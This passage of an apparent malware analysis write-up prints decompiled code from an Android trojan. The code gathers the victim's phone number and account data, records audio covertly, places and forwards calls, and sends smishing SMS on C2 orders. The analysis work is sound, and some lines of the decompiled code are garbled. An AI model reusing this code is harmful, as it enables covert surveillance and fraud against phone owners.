            <span class="n">String</span> <span class="n">phone_num</span> <span class="p">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">s</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">?</span> <span class="s">"Yjk="</span> <span class="p">:</span> <span class="s">"Yjg="</span><span class="p">;</span>  <span class="c1">// 0</span>
                                                             <span class="c1">// 1</span>
            <span class="n">String</span> <span class="n">s5</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">phone_num</span><span class="p">);</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">s3</span><span class="p">,</span> <span class="n">s5</span><span class="p">);</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlOA=="</span><span class="p">),</span> <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">sharedpref</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">ar</span><span class="p">));</span>  <span class="c1">// SP</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlYg=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">u</span><span class="p">(</span><span class="n">context0</span><span class="p">));</span>  <span class="c1">// SS</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzRmZA=="</span><span class="p">),</span> <span class="n">Locale</span><span class="p">.</span><span class="nf">getDefault</span><span class="p">().</span><span class="nf">getLanguage</span><span class="p">());</span>  <span class="c1">// LE</span>
            <span class="n">String</span> <span class="n">s6</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlMQ=="</span><span class="p">);</span>  <span class="c1">// SY</span>
            <span class="n">String</span> <span class="n">phone_num</span> <span class="p">=</span> <span class="n">i</span><span class="p">.</span><span class="nf">accessibility_status</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">ojfiq</span><span class="p">.</span><span class="k">class</span><span class="err">)</span> <span class="err">?</span> <span class="err">"</span><span class="nc">Yjk</span><span class="p">=</span><span class="s">" : "</span><span class="n">Yjg</span><span class="p">=</span><span class="s">";  // 0
</span>                                                                                                <span class="c1">// 1</span>
            <span class="n">String</span> <span class="n">s8</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">phone_num</span><span class="p">);</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">s6</span><span class="p">,</span> <span class="n">s8</span><span class="p">);</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJmNQ=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">default_sms_pkg</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>  <span class="c1">// SM</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzFmYw=="</span><span class="p">),</span> <span class="n">s1</span><span class="p">);</span>  <span class="c1">// ID</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzFlYg=="</span><span class="p">),</span> <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">sharedpref</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">ae</span><span class="p">));</span>  <span class="c1">// IS</span>
            <span class="n">String</span> <span class="n">s9</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzZlYQ=="</span><span class="p">);</span>  <span class="c1">// NR</span>
            <span class="n">String</span> <span class="n">phone_num</span> <span class="p">=</span> <span class="n">context1</span><span class="p">.</span><span class="nf">checkCallingOrSelfPermission</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">p</span><span class="p">)</span> <span class="p">==</span> <span class="m">0</span> <span class="p">?</span> <span class="p">((</span><span class="n">TelephonyManager</span><span class="p">)</span><span class="n">context1</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)).</span><span class="nf">getLine1Number</span><span class="p">()</span> <span class="p">:</span> <span class="s">""</span><span class="p">;</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">s9</span><span class="p">,</span> <span class="n">phone_num</span><span class="p">);</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2ZmOQ=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">google_acc</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>  <span class="c1">// GA</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDhlYg=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">check_permission</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">q</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>  <span class="c1">// PS</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDhmYg=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">check_permission</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">q</span><span class="p">[</span><span class="m">1</span><span class="p">]));</span>  <span class="c1">// PC</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDhlOA=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">check_permission</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">q</span><span class="p">[</span><span class="m">2</span><span class="p">]));</span>  <span class="c1">// PP</span>
            <span class="n">jSONObject0</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDhmNw=="</span><span class="p">),</span> <span class="n">i</span><span class="p">.</span><span class="nf">check_permission</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">,</span> <span class="n">c0</span><span class="p">.</span><span class="n">q</span><span class="p">[</span><span class="m">3</span><span class="p">]));</span>  <span class="c1">// PO</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">JSONException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2RlYTBlOGJlYzc2NGIwNjg2ODI1YjcwNzYwYzU4ZTRmNWZhYWRjMg=="</span><span class="p">));</span>  <span class="c1">// ERROR JSON CHECK BOT</span>
        <span class="p">}</span>
</code></pre></div></div>

<h1 id="recording-audio">Recording audio</h1>

<p>The malware has the ability to record audio without the knowledge of the user.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">protected</span> <span class="k">void</span> <span class="nf">onHandleIntent</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>  <span class="c1">// tick</span>
            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">parseInt</span><span class="p">(</span><span class="n">intent0</span><span class="p">.</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmNkMTNmYWY="</span><span class="p">)));</span>  <span class="c1">// tick</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">intent0</span><span class="p">.</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTZkOTMxYTE="</span><span class="p">));</span>  <span class="c1">// name</span>
            <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">&gt;</span> <span class="m">0</span> <span class="p">||</span> <span class="n">v</span> <span class="p">==</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SimpleDateFormat</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YzVmNTcxYTBkYTdiNzgyY2IwYjUyNDdiNzY3Mzc2YzJlZmNiOTE="</span><span class="p">),</span> <span class="n">Locale</span><span class="p">.</span><span class="n">US</span><span class="p">).</span><span class="nf">format</span><span class="p">(</span><span class="n">Calendar</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">getTime</span><span class="p">());</span>  <span class="c1">// MM-dd-yyyy_HH:mm:ss</span>
                <span class="k">this</span><span class="p">.</span><span class="n">d</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getExternalFilesDir</span><span class="p">(</span><span class="k">null</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YTc="</span><span class="p">)</span> <span class="p">+</span> <span class="n">s</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZDc="</span><span class="p">)</span> <span class="p">+</span> <span class="n">s1</span> <span class="p">+</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YTZkOTMxYjY="</span><span class="p">));</span>  <span class="c1">// .amr</span>
                                                                                                                                <span class="c1">// _</span>
                                                                                                                                <span class="c1">// /</span>
                <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2VmMTEwODE5ZTA0NDQxNg=="</span><span class="p">),</span> <span class="k">this</span><span class="p">.</span><span class="n">d</span><span class="p">);</span>  <span class="c1">// FILE REC</span>
                <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGNkMTMxYTE="</span><span class="p">),</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">v</span><span class="p">));</span>  <span class="c1">// Time</span>
                <span class="n">String</span> <span class="n">s2</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">d</span><span class="p">;</span>
                <span class="n">MediaRecorder</span> <span class="n">mediaRecorder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MediaRecorder</span><span class="p">();</span>
                <span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJmNzA5OGFmYQ=="</span><span class="p">),</span> <span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlYzFkOTZlYTc2NTMxMDhhODMyOTc3MWUxYTU0ZmE5YmZj"</span><span class="p">));</span>  <span class="c1">// START RECORD SOUND</span>
                                                                                                                   <span class="c1">// SOUND</span>
                <span class="k">this</span><span class="p">.</span><span class="n">a</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">setAudioSource</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">setOutputFormat</span><span class="p">(</span><span class="m">3</span><span class="p">);</span>
                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">setAudioEncoder</span><span class="p">(</span><span class="m">1</span><span class="p">);</span>
                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">setOutputFile</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
                <span class="n">Thread</span> <span class="n">thread0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Thread</span><span class="p">(</span><span class="k">new</span> <span class="nf">Runnable</span><span class="p">()</span> <span class="p">{</span>
                    <span class="n">@Override</span>
                    <span class="k">public</span> <span class="n">final</span> <span class="k">void</span> <span class="nf">run</span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">try</span> <span class="p">{</span>
                            <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">==</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                                <span class="n">Thread</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="m">900000L</span><span class="p">);</span>
                            <span class="p">}</span>
                            <span class="k">else</span> <span class="p">{</span>
                                <span class="n">Thread</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="n">v</span> <span class="p">*</span> <span class="m">1000</span><span class="p">);</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                        <span class="k">catch</span><span class="p">(</span><span class="n">InterruptedException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJmNzA5OGFmYQ=="</span><span class="p">),</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlYzEzOTQ5ZTA0NDQxNjg2OWUzZjEzNmQwNjRlZTE5MQ=="</span><span class="p">));</span>  <span class="c1">// STOP RECORD SOUND</span>
                                                                                                                                                          <span class="c1">// SOUND</span>
                            <span class="k">try</span> <span class="p">{</span>
                                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">stop</span><span class="p">();</span>
                                <span class="n">mediaRecorder0</span><span class="p">.</span><span class="nf">release</span><span class="p">();</span>
                                <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Y2VmMTEwODE="</span><span class="p">),</span> <span class="n">s2</span><span class="p">);</span>  <span class="c1">// FILE</span>
                                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">j</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">ba</span><span class="p">);</span>
                                <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">ba</span><span class="p">,</span> <span class="n">s</span> <span class="p">+</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YWI5Yjdm"</span><span class="p">)</span> <span class="p">+</span> <span class="n">s2</span><span class="p">);</span>  <span class="c1">// ###</span>
                                <span class="k">if</span><span class="p">(</span><span class="n">v</span> <span class="p">==</span> <span class="p">-</span><span class="m">1</span><span class="p">)</span> <span class="p">{</span>
                                    <span class="k">if</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">j</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">aZ</span><span class="p">).</span><span class="k">equals</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"Yjk="</span><span class="p">)))</span> <span class="p">{</span>  <span class="c1">// 1</span>
                                        <span class="n">Intent</span> <span class="n">intent0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">class</span><span class="err">).</span><span class="nc">putExtra</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmNkMTNmYWY="</span><span class="p">),</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"YTU4OQ=="</span><span class="p">)).</span><span class="nf">putExtra</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTZkOTMxYTE="</span><span class="p">),</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZmFkZDNmYWJjYzMyNWUzNGJjYTgxMjVj"</span><span class="p">));</span>  <span class="c1">// record_audio</span>
                                                                                                                                                                                                                                                                  <span class="c1">// name</span>
                                                                                                                                                                                                                                                                  <span class="c1">// -1</span>
                                                                                                                                                                                                                                                                  <span class="c1">// tick</span>
                                        <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">startService</span><span class="p">(</span><span class="n">intent0</span><span class="p">);</span>
                                        <span class="k">return</span><span class="p">;</span>
                                    <span class="p">}</span>

                                    <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">aY</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                                    <span class="k">return</span><span class="p">;</span>
                                <span class="p">}</span>

                                <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">e</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">c</span><span class="p">.</span><span class="n">aY</span><span class="p">,</span> <span class="s">""</span><span class="p">);</span>
                            <span class="p">}</span>
                            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                            <span class="p">}</span>

                            <span class="k">return</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">catch</span><span class="p">(</span><span class="n">Throwable</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                            <span class="k">return</span><span class="p">;</span>
                        <span class="p">}</span>

                        <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJmNzA5OGFmYQ=="</span><span class="p">),</span> <span class="n">izyiyumk</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZGJlYzEzOTQ5ZTA0NDQxNjg2OWUzZjEzNmQwNjRlZTE5MQ=="</span><span class="p">));</span>  <span class="c1">// STOP RECORD SOUND</span>
                                                                                                                                                      <span class="c1">// SOUND</span>

</code></pre></div></div>

<h1 id="classic-features">Classic features</h1>

<h2 id="call-and-call-forward">Call and call forward</h2>

<p>After granting all call permissions, the malware will have the ability to call or forward call.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">try</span> <span class="p">{</span>
                <span class="n">Intent</span> <span class="n">intent0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"android.intent.action.CALL"</span><span class="p">);</span>
                <span class="n">intent0</span><span class="p">.</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x10000000</span><span class="p">);</span>
                <span class="n">intent0</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s">"tel:"</span> <span class="p">+</span> <span class="n">Uri</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">s26</span><span class="p">)));</span>
                <span class="n">context1</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">intent0</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">s27</span> <span class="p">=</span> <span class="s">"USSD: "</span> <span class="p">+</span> <span class="n">s26</span> <span class="p">+</span> <span class="s">"[143523#]"</span><span class="p">;</span>
                <span class="n">i1</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"USSD"</span><span class="p">,</span> <span class="n">s27</span><span class="p">);</span>
                <span class="n">i1</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">i1</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">ab</span><span class="p">,</span> <span class="n">s27</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="n">i1</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"USSD"</span><span class="p">,</span> <span class="s">"Error: Start USSD"</span><span class="p">);</span>
                <span class="n">i1</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"USSD"</span><span class="p">,</span> <span class="s">"Error USSD[143523#]"</span><span class="p">);</span>
                <span class="n">i1</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">i1</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">ab</span><span class="p">,</span> <span class="s">"Error USSD[143523#]"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="n">label_1329</span><span class="p">:</span>
                <span class="n">i2</span> <span class="p">=</span> <span class="n">jwozx0</span><span class="p">.</span><span class="n">a</span><span class="p">;</span>
                <span class="n">s28</span> <span class="p">=</span> <span class="n">jSONObject5</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">jwozx0</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ZTY="</span><span class="p">));</span>  <span class="c1">// n</span>
            <span class="p">}</span>
            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">try</span> <span class="p">{</span>
                <span class="n">Intent</span> <span class="n">intent1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"android.intent.action.CALL"</span><span class="p">);</span>
                <span class="n">intent1</span><span class="p">.</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x10000000</span><span class="p">);</span>
                <span class="n">intent1</span><span class="p">.</span><span class="nf">setData</span><span class="p">(</span><span class="n">Uri</span><span class="p">.</span><span class="nf">fromParts</span><span class="p">(</span><span class="s">"tel"</span><span class="p">,</span> <span class="s">"*21*"</span> <span class="p">+</span> <span class="n">s28</span> <span class="p">+</span> <span class="s">"#"</span><span class="p">,</span> <span class="s">"#"</span><span class="p">));</span>
                <span class="n">context1</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">intent1</span><span class="p">);</span>
                <span class="n">String</span> <span class="n">s29</span> <span class="p">=</span> <span class="s">"ForwardCALL: "</span> <span class="p">+</span> <span class="n">s28</span> <span class="p">+</span> <span class="s">"[143523#]"</span><span class="p">;</span>
                <span class="n">i2</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="s">"ForwardCall"</span><span class="p">,</span> <span class="n">s29</span><span class="p">);</span>
                <span class="n">i2</span><span class="p">.</span><span class="nf">f</span><span class="p">(</span><span class="n">context1</span><span class="p">,</span> <span class="n">i2</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="n">ab</span><span class="p">,</span> <span class="n">s29</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">}</span>
</code></pre></div></div>

<h2 id="smishing">Smishing</h2>

<p>The malware has the ability to send SMSs to any contact using the phone number of the victim. The SMS text is received from the C2 server then sent to another victim.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">public</span> <span class="n">final</span> <span class="k">void</span> <span class="nf">send_sms</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">,</span> <span class="n">String</span> <span class="n">s1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">SmsManager</span> <span class="n">smsManager0</span> <span class="p">=</span> <span class="n">SmsManager</span><span class="p">.</span><span class="nf">getDefault</span><span class="p">();</span>
            <span class="n">ArrayList</span> <span class="n">arrayList0</span> <span class="p">=</span> <span class="n">smsManager0</span><span class="p">.</span><span class="nf">divideMessage</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
            <span class="kt">int</span> <span class="n">v</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
            <span class="n">PendingIntent</span> <span class="n">pendingIntent0</span> <span class="p">=</span> <span class="n">PendingIntent</span><span class="p">.</span><span class="nf">getBroadcast</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"SMS_SENT"</span><span class="p">),</span> <span class="m">0</span><span class="p">);</span>
            <span class="n">PendingIntent</span> <span class="n">pendingIntent1</span> <span class="p">=</span> <span class="n">PendingIntent</span><span class="p">.</span><span class="nf">getBroadcast</span><span class="p">(</span><span class="n">context0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">new</span> <span class="nf">Intent</span><span class="p">(</span><span class="s">"SMS_DELIVERED"</span><span class="p">),</span> <span class="m">0</span><span class="p">);</span>
            <span class="n">ArrayList</span> <span class="n">arrayList1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ArrayList</span><span class="p">();</span>
            <span class="n">ArrayList</span> <span class="n">arrayList2</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ArrayList</span><span class="p">();</span>
            <span class="k">while</span><span class="p">(</span><span class="n">v</span> <span class="p">&lt;</span> <span class="n">arrayList0</span><span class="p">.</span><span class="nf">size</span><span class="p">())</span> <span class="p">{</span>
                <span class="n">arrayList2</span><span class="p">.</span><span class="k">add</span><span class="p">(</span><span class="n">pendingIntent1</span><span class="p">);</span>
                <span class="n">arrayList1</span><span class="p">.</span><span class="k">add</span><span class="p">(</span><span class="n">pendingIntent0</span><span class="p">);</span>
                <span class="p">++</span><span class="n">v</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">smsManager0</span><span class="p">.</span><span class="nf">sendMultipartTextMessage</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="n">arrayList0</span><span class="p">,</span> <span class="n">arrayList1</span><span class="p">,</span> <span class="n">arrayList2</span><span class="p">);</span>
